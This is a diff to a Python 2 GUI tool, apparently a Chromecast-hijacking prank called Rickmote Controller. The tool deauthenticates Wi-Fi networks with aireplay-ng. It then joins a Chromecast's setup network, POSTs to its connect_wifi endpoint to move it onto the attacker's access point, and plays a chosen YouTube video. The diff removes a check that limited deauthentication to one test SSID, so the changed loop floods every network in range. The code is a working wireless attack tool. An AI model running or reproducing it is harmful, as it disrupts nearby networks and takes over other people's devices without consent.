@@ -5,17 +5,22 @@ import tkFont
 from string import *
 import os.path
 import sys
-import csv
 import time
-import re
 import subprocess 
 import socket
 import requests
 import json
 
 #For the actual video playback
-import time
 import pychromecast as pc
+
+#XXX Edit these two values
+WLAN0_BSSID = "YOUR_MAC_ADDRESS_HERE" #The wifi client
+WLAN2_BSSID = "YOUR_MAC_ADDRESS_HERE" #The wifi AP
+
+#XXX The YouTube video to play. Default is Rickroll. IE:
+# https://www.youtube.com/watch?v=dQw4w9WgXcQ
+YOUTUBE_SUFFIX = "dQw4w9WgXcQ"
 
 def get_name(cell):
     return matching_line(cell,"ESSID:")[1:-1]
@@ -58,11 +63,7 @@ rules={"Name":get_name,
 
 # You can choose which columns to display here, and most importantly in what order. Of
 # course, they must exist as keys in the dict rules.
-
 columns=["Name","Address","Quality","Channel","Encryption"]
-
-# Below here goes the boring stuff. You shouldn't have to edit anything below
-# this point
 
 def matching_line(lines, keyword):
     """Returns the first matching line in a list of lines. See match()"""
@@ -93,14 +94,11 @@ def parse_cell(cell):
 
 
 
-
-
 class WiFiNetwork:
     def __init__(self, SSID, MAC, ENC):
         self.SSID = SSID
         self.MAC = MAC
         self.ENC = ENC
-        print "DEBUG:", SSID, MAC, ENC
 
 class callit:
     def __init__(self, function, *args ):
@@ -137,21 +135,13 @@ class RickcastWindow( Tk ):
         self.ClearWindow()
         #deauth all the networks!
         for network in network_list:
-            if network.SSID == "ermagerd":
-                print "DEBUG deauth'ing network: " + network.SSID
-                #TODO this is bad. Why would you do this?!
-                os.system("aireplay-ng -D -0 0 -a" + network.MAC + " mon0 &")
-                #TODO quick hack
-                #os.system("aireplay-ng -D -0 25 -a 00:0F:66:2C:A7:24 mon0 &")
-            else:
-                print "DEBUG skipping " + network.SSID + " network"
+            os.system("aireplay-ng -D -0 0 -a" + network.MAC + " mon0 &")
 
     def FindChromecasts(self, network_list):
         self.ClearWindow()
         new_network_list = self.ReadNetworkList()
         for network in new_network_list:
             if network.ENC == "Open":
-                print "DEBUG: found open network - " + network.SSID
                 self.Rickroll(network)
         self.MainMenu()
         
@@ -170,7 +160,7 @@ class RickcastWindow( Tk ):
         "\n[802-11-wireless]"
         "\nssid=" + network.SSID +
         "\nmode=infrastructure"
-        "\nmac-address=80:1F:02:EE:4A:A9"
+        "\nmac-address=" + WLAN0_BSSID +
         "\n"
         "\n[ipv6]"
         "\nmethod=auto"
@@ -182,7 +172,6 @@ class RickcastWindow( Tk ):
         f.write(connection)
         f.close()
 
-        print "DEBUG: nmcli con up id Chromecast iface wlan0"
         os.system("nmcli con up id Chromecast iface wlan0")
         
 
@@ -192,27 +181,22 @@ class RickcastWindow( Tk ):
         #Skip if ssid is blank. This definitely won't be a chromecast, and
         # there's a lot of false positives with blank ssid's
         if(len(network.SSID) == 0):
-            print "DEBUG: Skipping blank SSID" 
             return
 
         #also ignore our own network
         if(network.SSID == "RickmoteController"):
-            print "DEBUG: Skipping RickmoteController" 
             return
 
         self.ConnectToNetwork(network)
 
         #Test to see if this is a Chromecast network or just a regular Open one
         try:
-            print "DEBUG: GET'ing for eureka"
             eureka = requests.get("http://192.168.255.249:8008/setup/eureka_info")
             if eureka.status_code == 200:
-                print "DEBUG: yay! A Chromecast network!"
                 headers = {'content-type': 'application/json'}
-                payload = {"bssid":"10:fe:ed:23:57:24","signal_level":-49,"ssid":"RickmoteController","wpa_auth":1,"wpa_cipher":1}
+                payload = {"bssid": WLAN2_BSSID,"signal_level":-49,"ssid":"RickmoteController","wpa_auth":1,"wpa_cipher":1}
                 setup = requests.post("http://192.168.255.249:8008/setup/connect_wifi", data=json.dumps(payload), headers=headers)
                 if setup.status_code == 200:
-                    print "DEBUG: waaaaait for it........."
                     #First, set the routing correctly, since it's probably all screwed up
                     time.sleep(5)
                     #Disconnect from client wifi
@@ -223,9 +207,9 @@ class RickcastWindow( Tk ):
                     time.sleep(3)
                     self.PlayVideo()
                 else:
-                    print "DEBUG: Chromecast exists, but rejected our POST to it.... HTTP code: " + str(setup.status_code)
+                    print "ERROR: Chromecast exists, but rejected our POST to it.... HTTP code: " + str(setup.status_code)
             else:
-                print "DEBUG: Chromecast exists, but had HTTP error: " + str(eureka.status_code)
+                print "ERROR: Chromecast exists, but had HTTP error: " + str(eureka.status_code)
         except Exception as e:
             "DEBUG: Not a Chromecast network. Detailed error -> " + str(e)
 
@@ -235,11 +219,10 @@ class RickcastWindow( Tk ):
     def PlayVideo(self):
         cast = pc.PyChromecast()
         print cast.device
-        print "DEBUG: Current app:", cast.app
 
         # Make sure an app is running that supports RAMP protocol
         if not cast.app or pc.PROTOCOL_RAMP not in cast.app.service_protocols:
-            pc.play_youtube_video("dQw4w9WgXcQ", cast.host)
+            pc.play_youtube_video(YOUTUBE_SUFFIX, cast.host)
             cast.refresh()
 
         ramp = cast.get_protocol(pc.PROTOCOL_RAMP)
@@ -257,7 +240,6 @@ class RickcastWindow( Tk ):
     def MainMenu(self):
         self.ClearWindow()
 
-        #TODO
         os.system("killall aireplay-ng")
 
         network_list = self.ReadNetworkList()
@@ -270,7 +252,6 @@ class RickcastWindow( Tk ):
 
     def ReadNetworkList(self):
         #scan for networks
-        print "DEBUG: Scanning for networks..."
         proc = subprocess.Popen('iwlist wlan0 scan 2>/dev/null', shell=True, stdout=subprocess.PIPE )
         stdout_str = proc.communicate()[0]
         stdout_list=stdout_str.split('\n')
@@ -303,6 +284,7 @@ class RickcastWindow( Tk ):
 
 if __name__ == '__main__':
     demo = RickcastWindow()
-    demo.attributes('-fullscreen', True)
+    #XXX Uncomment this line to make the window fullscreen
+    #demo.attributes('-fullscreen', True)
     demo.mainloop()
 
